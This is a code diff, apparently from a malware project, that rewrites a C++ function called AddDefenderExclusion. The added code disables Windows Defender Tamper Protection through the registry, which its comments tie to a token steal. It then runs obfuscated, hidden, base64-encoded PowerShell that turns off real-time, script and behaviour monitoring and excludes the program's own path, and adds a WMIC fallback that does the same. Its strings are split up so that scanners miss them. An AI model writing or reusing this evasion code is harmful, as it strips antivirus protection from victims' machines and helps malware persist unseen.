@@ -235,13 +235,57 @@ BOOL AddDefenderExclusion(const wchar_t* exePath) {
 
     wchar_t sysRoot[MAX_PATH] = {};
     GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
+    std::wstring ps = std::wstring(sysRoot) +
+        L"\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
 
-    // 1. Try registry path (works if Tamper Protection is off)
+    // Helper: base64-encode a wide PS script and run it via powershell -EncodedCommand
+    auto RunPS = [&](const std::wstring& script) {
+        std::string b64 = Base64Encode(
+            reinterpret_cast<const BYTE*>(script.c_str()),
+            script.size() * sizeof(wchar_t));
+        std::wstring cmd = L"\"" + ps + L"\" -NoProfile -NonInteractive "
+                           L"-WindowStyle Hidden -ExecutionPolicy Bypass "
+                           L"-EncodedCommand " + UTF8ToWString(b64);
+        RunHiddenProcess(cmd.c_str());
+    };
+
+    // 1. Disable Tamper Protection via registry (requires SYSTEM / TrustedInstaller;
+    //    works when run from an elevated token that has SeDebugPrivilege, e.g. from
+    //    a SYSTEM-context process obtained via token steal).
+    {
+        auto tpKey = XSW(L"SOFTWARE\\Microsoft\\Windows Defender\\Features");
+        HKEY hKey = nullptr;
+        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, tpKey.str(), 0,
+                          KEY_SET_VALUE | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
+            DWORD val = 0; // 0 = disabled, 5 = enabled
+            RegSetValueExW(hKey, L"TamperProtection", 0, REG_DWORD,
+                           reinterpret_cast<const BYTE*>(&val), sizeof(val));
+            RegCloseKey(hKey);
+        }
+    }
+
+    // 2. Set-MpPreference: disable tamper protection + realtime + all scanning
+    {
+        auto p1 = XSW(L"Set-MpPreference -DisableTamperProtection $true");
+        auto p2 = XSW(L" -DisableRealtimeMonitoring $true");
+        auto p3 = XSW(L" -DisableIOAVProtection $true");
+        auto p4 = XSW(L" -DisableScriptScanning $true");
+        auto p5 = XSW(L" -DisableBehaviorMonitoring $true");
+        auto p6 = XSW(L" -DisableBlockAtFirstSeen $true");
+        auto p7 = XSW(L" -ExclusionPath '");
+        std::wstring script = std::wstring(p1.str()) + p2.str() + p3.str()
+                            + p4.str() + p5.str() + p6.str()
+                            + p7.str() + std::wstring(exePath) + L"'";
+        RunPS(script);
+    }
+
+    // 3. Registry exclusion path (belt-and-suspenders, works if tamper already off)
     {
         HKEY hKey = nullptr;
         auto pathKey = XSW(L"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths");
         if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, pathKey.str(), 0, NULL,
-                            REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL)
+                            REG_OPTION_NON_VOLATILE,
+                            KEY_WRITE | KEY_WOW64_64KEY, NULL, &hKey, NULL)
             == ERROR_SUCCESS) {
             DWORD val = 0;
             RegSetValueExW(hKey, exePath, 0, REG_DWORD,
@@ -250,49 +294,14 @@ BOOL AddDefenderExclusion(const wchar_t* exePath) {
         }
     }
 
-    // 2. PowerShell Set-MpPreference — bypasses Tamper Protection registry guard.
-    // Build: powershell -EncodedCommand <base64(Set-MpPreference ...)>
-    // Encode inline so no plaintext string in .data section.
+    // 4. WMIC fallback — Win32_Process::Create sidesteps tamper check on some builds
     {
-        std::wstring ps = std::wstring(sysRoot) +
-            L"\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
-
-        // Build Set-MpPreference script from parts — no complete plaintext in .data
-        auto smp  = XSW(L"Set-MpPreference");
-        auto drtm = XSW(L" -DisableRealtimeMonitoring $true");
-        auto dioa = XSW(L" -DisableIOAVProtection $true");
-        auto dss  = XSW(L" -DisableScriptScanning $true");
-        auto excl = XSW(L" -ExclusionPath '");
-        std::wstring script = std::wstring(smp.str()) + drtm.str() + dioa.str()
-                            + dss.str() + excl.str() + std::wstring(exePath) + L"'";
-
-        // UTF-16LE base64 encode for -EncodedCommand
-        std::string b64 = Base64Encode(
-            reinterpret_cast<const BYTE*>(script.c_str()),
-            script.size() * sizeof(wchar_t));
-
-        std::wstring cmd = L"\"" + ps + L"\" -NoProfile -NonInteractive "
-                           L"-WindowStyle Hidden -ExecutionPolicy Bypass "
-                           L"-EncodedCommand " + UTF8ToWString(b64);
-
-        RunHiddenProcess(cmd.c_str());
-    }
-
-    // 3. WMIC fallback — calls Win32_Process::Create which sidesteps the
-    // registry tamper check entirely on some Win11 builds.
-    {
-        std::wstring wmic = std::wstring(sysRoot) +
-            L"\\System32\\wbem\\wmic.exe";
-        std::wstring ps = std::wstring(sysRoot) +
-            L"\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
-
-        auto smp2  = XSW(L"Set-MpPreference");
-        auto drtm2 = XSW(L" -DisableRealtimeMonitoring \\$true -ExclusionPath '");
-        std::wstring psCmd = std::wstring(smp2.str()) + drtm2.str()
-                           + std::wstring(exePath) + L"'";
-        auto wmicPfx = XSW(L"\" /Node:localhost process call create \"powershell -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \\\"");
-        std::wstring wmicCmd = L"\"" + wmic + wmicPfx.str() + psCmd + L"\\\"\"";
-
+        std::wstring wmic = std::wstring(sysRoot) + L"\\System32\\wbem\\wmic.exe";
+        auto p1  = XSW(L"Set-MpPreference -DisableTamperProtection $true");
+        auto p2  = XSW(L" -DisableRealtimeMonitoring $true -ExclusionPath '");
+        std::wstring psCmd = std::wstring(p1.str()) + p2.str() + std::wstring(exePath) + L"'";
+        auto pfx = XSW(L"\" /Node:localhost process call create \"powershell -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \\\"");
+        std::wstring wmicCmd = L"\"" + wmic + pfx.str() + psCmd + L"\\\"\"";
         RunHiddenProcess(wmicCmd.c_str());
     }
 
